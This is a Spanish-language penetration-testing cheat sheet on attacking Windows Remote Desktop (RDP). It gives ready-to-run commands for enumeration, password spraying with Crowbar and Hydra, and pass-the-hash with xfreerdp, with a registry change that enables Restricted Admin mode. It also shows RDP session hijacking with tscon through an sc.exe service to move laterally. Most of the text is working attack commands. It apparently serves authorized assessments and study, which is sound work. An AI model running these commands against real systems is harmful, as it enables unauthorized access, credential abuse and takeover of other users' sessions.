---
tags:
  - RDP
---
# 🖥️ RDP

RDP (Remote Desktop Protocol) es el protocolo propietario de Microsoft para escritorio remoto. Expone una interfaz gráfica completa del sistema. Puerto por defecto: **3389/TCP**.

---

## Conexión

```bash
# Con contraseña
xfreerdp /v:<IP> /u:usuario /p:contraseña

# Montar directorio local en la sesión remota
xfreerdp /v:<IP> /u:usuario /p:contraseña /drive:share,/ruta/local

# Con rdesktop
rdesktop -u usuario -p contraseña <IP>
```

---

## Enumeración

```bash
nmap -sV -p 3389 <IP>
nmap -p 3389 --script rdp-enum-encryption <IP>
```

---

## Ataques de contraseña

### Password spraying con Crowbar

```bash
crowbar -b rdp -s <IP>/32 -U usuarios.txt -c 'Password123'
```

### Password spraying con Hydra

```bash
hydra -L usuarios.txt -p 'Password123' <IP> rdp -t 4
```

> ⚠️ RDP no tolera muchas conexiones paralelas. Usar `-t 1` o `-t 4` y añadir `-W 3` para esperar entre intentos.

---

## Pass-the-Hash (PtH)

Si se dispone del hash NTLM del usuario pero no de la contraseña en texto claro, `xfreerdp` permite autenticarse directamente con el hash.

**Requisito previo:** el modo `Restricted Admin` debe estar habilitado en el objetivo. Para habilitarlo:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp /v:<IP> /u:usuario /pth:<HASH_NTLM>
```

---

## Secuestro de sesión RDP

Si se ha obtenido acceso al sistema y otro usuario tiene una sesión RDP activa, es posible secuestrarla con `tscon` para moverse lateralmente sin necesitar su contraseña. Requiere privilegios `SYSTEM`.

### Ver sesiones activas

```cmd
query user
```

Salida:
```
 USERNAME     SESSIONNAME   ID  STATE
>juurena      rdp-tcp#13     1  Active
 lewen        rdp-tcp#14     2  Active
```

### Secuestrar sesión con sc.exe

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
```

Esto abre la sesión del usuario `lewen` dentro de la sesión actual.

> ⚠️ Este método no funciona en Windows Server 2019 o superior.

---

## Ver también

- [Escalada de privilegios en Linux](../04-post-explotacion/escalada-en-linux.md)
- [Contraseñas Windows](../04-post-explotacion/contrases-windows.md)


Tenga en cuenta que esto no funcionará contra todos los sistemas Windows que encontremos, pero siempre vale la pena intentarlo en una situación en la que tengamos un hash NTLM, sepamos que el usuario tiene derechos RDP contra una máquina o conjunto de máquinas, y el acceso GUI nos beneficiaría de alguna manera para cumplir el objetivo de nuestra evaluación.

